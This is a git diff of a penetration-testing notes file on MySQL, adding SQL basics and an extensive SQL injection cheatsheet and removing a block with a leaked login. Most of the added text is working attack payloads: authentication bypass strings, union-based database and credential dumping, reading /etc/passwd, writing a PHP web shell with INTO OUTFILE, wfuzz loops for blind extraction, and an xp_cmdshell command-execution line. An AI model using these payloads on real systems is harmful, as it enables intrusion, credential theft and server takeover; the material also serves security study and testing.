@@ -11,27 +11,63 @@ nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-em
 ```bash
 mysql -u root -p
 mysql -u root -p'root' -h $ip -P 3306
-```
-
-#### Connecting
-
-```bash
-mysql -u root -p'root' -h 192.168.50.16 -P 3306
-
-www-data@debian:/home/skunk$ mysql -u 'lavita' -p 'sdfquelw0kly9jgbx92'
-ERROR 1044 (42000): Access denied for user 'lavita'@'localhost' to database 'sdfquelw0kly9jgbx92'
-
-www-data@debian:/home/skunk$ mysql -u 'lavita' -p 'lavita' #  lavita db
-MariaDB [lavita]> 
+mysql -u 'lavita' -p 'lavita' #  lavita db
 ```
 
 #### Commands
 
-```sql
-show databases;
-show tables;
-use db_name;
-select * from passwords;
+```sql	
+mysql -u root -h docker.hackthebox.eu -P 3306 -p #	login to mysql database
+SHOW DATABASES #	List available databases
+USE users #	Switch to database
+CREATE TABLE logins (id INT, ...) #	Add a new table
+SHOW TABLES #	List available tables in current database
+DESCRIBE logins #	Show table properties and columns
+INSERT INTO table_name VALUES (value_1,..) #	Add values to table
+INSERT INTO table_name(column2, ...) VALUES (column2_value, ..) #	Add values to specific columns in a table
+UPDATE table_name SET column1=newvalue1, ... WHERE <condition> #	Update table values
+SELECT * FROM table_name #	Show all columns in a table
+SELECT column1, column2 FROM table_name #	Show specific columns in a table
+DROP TABLE logins #	Delete a table
+ALTER TABLE logins ADD newColumn INT #	Add new column
+ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn #	Rename column
+ALTER TABLE logins MODIFY oldColumn DATE #	Change column datatype
+ALTER TABLE logins DROP oldColumn #	Delete column
+SELECT * FROM logins ORDER BY column_1 #	Sort by column
+SELECT * FROM logins ORDER BY column_1 DESC #	Sort by column in descending order
+SELECT * FROM logins ORDER BY column_1 DESC, id ASC #	Sort by two-columns
+SELECT * FROM logins LIMIT 2 #	Only show first two results
+SELECT * FROM logins LIMIT 1, 2 #	Only show first two results starting from index 2
+SELECT * FROM table_name WHERE <condition> #	List results that meet a condition
+SELECT * FROM logins WHERE username LIKE 'admin%' #	List results where the name is similar to a given string
+```
+
+```sql	
+# Auth Bypass
+admin' or '1'='1 #	Basic Auth Bypass
+admin')-- - #	Basic Auth Bypass With comments	
+# Union Injection 	
+' order by 1-- - #	Detect number of columns using order by
+cn' UNION select 1,2,3-- - #	Detect number of columns using Union injection
+cn' UNION select 1,@@version,3,4-- - #	Basic Union injection
+UNION select username, 2, 3, 4 from passwords-- - #	Union injection for 4 columns
+# DB Enumeration 	
+SELECT @@version #	Fingerprint MySQL with query output
+SELECT SLEEP(5) #	Fingerprint MySQL with no output
+cn' UNION select 1,database(),2,3-- - #	Current database name
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - #	List all databases
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - #	List all tables in a specific database
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - #	List all columns in a specific table
+cn' UNION select 1, username, password, 4 from dev.credentials-- - #	Dump data from a table in another database
+# Privileges 	
+cn' UNION SELECT 1, user(), 3, 4-- - #	Find current user
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- - #	Find if user has admin privileges
+cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- - #	Find if all user privileges
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- - #	Find which directories can be accessed through MySQL
+# File Injection 	
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- - #	Read local file
+select 'file written successfully!' into outfile '/var/www/html/proof.txt' #	Write a string to a local file
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- - #	Write a web shell into the base web directory
 ```
 
 #### Login
@@ -202,4 +238,184 @@ http://site.com/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM
 ' union select null,table_name,null from all_tables-- # Get table name
 ' union select null,column_name,null from all_tab_columns where table_name='<table_name>'-- # Get column name
 ' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS-- # Dump data
+```
+
+#### SQL Injection Cheatsheet
+This cheatsheet should NOT be conbsiderd as reference but guide to built on, some of the examples below will require modification(s) such as url encode, comments, etc. Before we contiune here is couple good to know SQL functions
+
+```php
+limit <row offset>,<number of rows>                          # display rows based on offset and number  
+
+count(*)                                                     # display number of rows  
+
+rand()                                                       # generate random number between 0 and 1 
+
+floor(rand()*<number>)                                       # print out number part of random decimal number 
+
+select(select database());                                   # double query (nested) using database() as an example 
+
+group by <column name>                                       # summerize rows based on column name  
+
+concat(<string1>, <string2>, ..)                             # concatenate strings such as tables, column names  
+
+length(<string>)                                             # calculate the number of characters for given string 
+
+substr(<string>,<offset>,<characters length>)                # print string character(s) by providing offset and length 
+
+ascii(<character>)                                           # decimal representation of the character 
+
+sleep(<number of seconds>)                                   # go to sleep for <number of seconds>
+
+if(<condition>,<true action>,<false action>)                 # conditional if statement 
+
+like "<string>%"                                             # checks if provided string present
+
+outfile "<url to file>"                                      # dump output of select statement into a file
+
+load_file("<url to file>")                                   # dump the content of file
+```
+Now comes the fun part, here's combination of error, union, blind SQL command injection examples.
+
+Determine back-end query number of columns with error-based string SQL command injection
+```php
+http://meh.com/index.php?id=1 order by <number>
+```
+
+Determine back-end query number of columns by observing `http response size` with `wfuzz` in error-based integer SQL command injection
+```php
+wfuzz -c -z range,1-10 "http://meh.com/index.php?id=1 order by FUZZ"
+```
+
+Identify webpage printable union columns by providing false value to back-end query with error-based integer SQL command injection. This injection depends on number of columns identified by `order by` clause
+```php
+http://meh.com/index.php?id=-1 union select <number of columns seperated by comma>
+```
+
+Dump the content of table into the filesystem
+```php
+http://meh.com/index.php?id=-1')) union select <column1>,<column2> from <table name> into outfile "<url to file>" --+
+```
+
+Print back-end SQL version with error-based integer SQL command injection, assuming column 3 content gets diplayed on webpage
+```php
+http://meh.com/index.php?id=-1 union select 1,2,@@version,4,...
+```
+
+Print user running the query to access back-end database server with error-based integer SQL command injection
+```php
+http://meh.com/index.php?id=-1 union select 1,2,user(),4,...
+```
+
+Print database name with error-based integer SQL command injection
+```php
+http://meh.com/index.php?id=-1 union select 1,2,database(),4,...
+```
+
+Print database directory with error-based integer SQL command injection
+```php
+http://meh.com/index.php?id=-1 union select 1,2,@@datadir,4,...
+```
+
+Print table names with error-based integer SQL command injection
+```php
+http://meh.com/index.php?id=-1 union select 1,2,group_concat(table_name),4,... from information_schema.tables where table_schema=database()
+```
+
+Print column names with error-based integer SQL command injection
+```php
+http://meh.com/index.php?id=-1 union select 1,2,group_concat(column_name),4,... from information_schema.columns where table_name='<table name>'
+```
+
+Print content of column with error-based integer SQL command injection 
+```php
+http://meh.com/index.php?id=-1 union select 1,2,group_concat(<column name>),4,... from <table name>
+```
+
+Use `and` statement as substitute to reqular comments such as `--+`, `#`, and `/* */` with error-based string SQL command injection
+```php
+http://meh.com/index.php?id=1' <sqli here> and '1
+```
+Determine databsae name with boolean-based blind SQL injection with `substr()`
+```php
+http://meh.com/index.php?id=1' and (substr(database(),<offset>,<character length>))='<character>' --+
+```
+
+Determine databsae name with boolean-based blind SQL injection by observing `http response size` with combination of `substr()` and `wfuzz`, assuming database name does not include special characters
+```php
+for i in $(seq 1 10); do wfuzz -c -z list,a-b-c-d-e-f-g-h-i-j-k-l-m-n-o-p-q-r-s-t-u-v-w-x-y-z --hw=<word count> "http://meh.com/index.php?id=1' and (substr(database(),$i,1))='FUZZ' --+";done 
+```
+Determine databsae name with boolean-based blind SQL injection by observing `http response size` with `substr()`, `ascii()` and `wfuzz`. The below range is the standard ASCII characters (32-127) 
+```php
+for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr(database(),$i,1)))=FUZZ --+";done 
+```
+
+Determine table name with boolean-based blind SQL injection by observing `http response size` with `substr()`, `ascii()`, and `wfuzz`.The below range is the standard ASCII characters (32-127) 
+```php
+for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ --+";done # increment limit first argument by 1 to get the next available table name 
+```
+
+Determine column name with boolean blind-based SQL injection by observing `http response size` with `substr()`, `ascii()`, and `wfuzz`. The below range is the standard ASCII characters (32-127) 
+```php
+for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name=<table name> limit 0,1),$i,1)))=FUZZ --+";done # increment limit first argument by 1 to get the next available column name 
+```
+Boolean-based blind SQL command injection demo
+
+![alt text](https://j.gifs.com/W77p8o.gif)
+
+Confirm time-based blind SQL injection using `sleep()` function
+```php
+http://meh.com/index.php?id=1' and sleep(10) --+
+```
+
+Determine database version with time-based blind SQL injection using `sleep()`, `like""`, and conditional `if`, assuming the back-end database is running version 5
+```php
+http://meh.com/index.php?id=1' and if((select version()) like "5%", sleep(10), null) --+
+```
+
+Determine database name with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, and `wfuzz`.The below range is the standard ASCII characters (32-127)
+```php
+for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://meh.com/index.php?id=1' and if((ascii(substr(database(),$i,1)))=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt>
+```
+
+Determine table name with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, `if`, and `wfuzz`.The below range is the standard ASCII characters (32-127)
+```php
+for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://meh.com/index.php?id=1' and if((select ascii(substr(table_name,$i,1))from information_schema.tables where table_schema=database() limit 0,1)=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # increment limit first argument by 1 to get the next available table name 
+```
+Determine column name with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, `if`, and `wfuzz`.The below range is the standard ASCII characters (32-127)
+```php
+for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://meh.com/index.php?id=1' and if((select ascii(substr(column_name,$i,1))from information_schema.columns where table_name='<table name>' limit 0,1)=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # increment limit first argument by 1 to get the next available column name 
+```
+
+Extract column content with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, `if`, and `wfuzz`.The below range is the standard ASCII characters (32-127)
+```php
+for i in $(seq 1 10); do wfuzz -v -c -z range,0-10 -z range,32-127 "http://meh.com/index.php?id=1' and if(ascii(substr((select <column name> from <table name> limit FUZZ,1),$i,1))=FUZ2Z, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # change <column name> to get the content of next column
+```
+Time-based blind SQL command injection with bash magic demo
+
+![alt text](https://j.gifs.com/2vv2J1.gif)
+
+Hope those were helpfull! Now here's couple login bypass commands that worked for me
+```php
+meh' OR 3=3;#
+meh' OR 2=2 LIMIT 1;#
+meh' OR 'a'='a
+meh' OR 1=1 --+
+```
+Sometimes you'll run into Microsoft SQL server that have `xp_cmdshell` turned on, here's syntax for remote code execution
+```php
+meh' exec master..xp_cmdshell '<command here>' --
+```
+
+Final notes!
+- If you made it this far then you know that most of the SQL command injection examples are based on `MySQL` and I don't plan on making any for `MSSQL` cause I'm lazy
+- Use your proxy of choice to bypass client-side javascript restrictions
+- `order by` clause works only with regular comments such as `--+`
+- Update ASCII range to include special characters if you're going after users table
+- `MySQL` don't have permissions to overwrite an exsisting file, make sure you go with new filename every single time with `outfile`.
+- Make sure the vulnerable paramater have false value when working with union-based SQL command injection
+- It's worth noting that all of the examples in this cheatsheet where http `GET` requests, and it shouldn't be that hard to replicate them with http `POST`requests once you grasp the core concepts.
+- You need to input true value to the vulnerable paramter for `and sleep()` to work, otherwise go with `or sleep()`. Here's an example for the sake of clarification
+```php
+http://meh.com/index.php?id=<true value>' and sleep(1) #
+http://meh.com/index.php?id=<false value>' or sleep(1) #
 ```
